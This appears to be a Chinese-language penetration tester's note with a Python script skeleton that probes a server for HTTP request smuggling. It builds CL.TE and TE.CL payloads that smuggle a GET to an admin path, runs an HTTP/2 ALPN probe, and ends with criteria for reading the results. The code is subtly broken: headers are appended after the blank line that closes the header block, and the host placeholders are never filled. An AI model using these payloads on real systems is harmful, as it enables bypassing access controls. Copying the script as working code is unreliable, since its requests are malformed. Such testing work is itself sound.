复现脚本骨架（python3，直连不走代理）：

import socket, ssl
def conn(host,port,alpn=("http/1.1",)):
    c=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); c.check_hostname=False; c.verify_mode=ssl.CERT_NONE
    c.set_alpn_protocols(list(alpn))
    s=c.wrap_socket(socket.create_connection((host,port),timeout=8),server_hostname=host)
    print("ALPN:", s.selected_alpn_protocol())
    return s

def send(raw, host="203.0.113.83", port=1273):
    s=conn(host,port); s.sendall(raw); buf=b""
    try:
        while True:
            b=s.recv(65535)
            if not b: break
            buf+=b
    except Exception: pass
    s.close(); return buf

smug = b"GET /melody-admin/ HTTP/1.1\r\nHost: %s:%d\r\n\r\n"
base = (b"POST /melody/api/v1/heart HTTP/1.1\r\nHost: %s:%d\r\n\r\n")

# CL.TE（期望：400，说明前端拒绝共存，而不是把走私请求放行）
body = b"0\r\n\r\n" + smug
r = base + b"Content-Length: %d\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n" % len(body) + body

# TE.CL
chunk = ("%x\r\n" % len(smug)).encode() + smug + b"\r\n0\r\n\r\n"
r2 = base + b"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n" + chunk

# h2 探测
try: conn("203.0.113.83",1273,("h2",))
except Exception as e: print("h2 refused:", e)   # tlsv1 alert no application protocol

判据：CL+TE 命中 400 即代表该前端不会被 CL/TE 歧义劫持；若想确认上游是否被执行，看响应条数与响应体指纹（上游 Spring 的 JSON 404/401 vs 前端的 0 体 404）。